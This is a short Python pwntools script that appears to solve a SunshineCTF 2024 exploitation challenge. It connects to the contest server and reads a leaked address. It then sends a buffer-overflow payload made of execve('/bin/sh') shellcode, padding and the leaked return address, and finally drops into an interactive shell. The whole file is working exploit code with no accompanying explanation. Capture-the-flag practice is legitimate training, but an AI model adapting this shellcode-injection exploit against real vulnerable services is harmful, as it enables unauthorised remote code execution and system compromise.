from pwn import *

# Establish the target
HOST = "2024.sunshinectf.games"
PORT = 24603
target = remote(HOST, PORT)

# Scan in the infoleak
target.recvuntil(b': ')
leak = target.recvline()
leak = leak.strip(b"\n")
leak_val = int(leak, 0x10)

# Print the leak
log.info("leak is: " + hex(leak_val))

# Establish the shellcode, I forget where it's from
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# Form the payload
filler = 0x78 - len(shellcode) + 48
payload = shellcode + b"0"*filler + p64(leak_val)

# Send the payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()

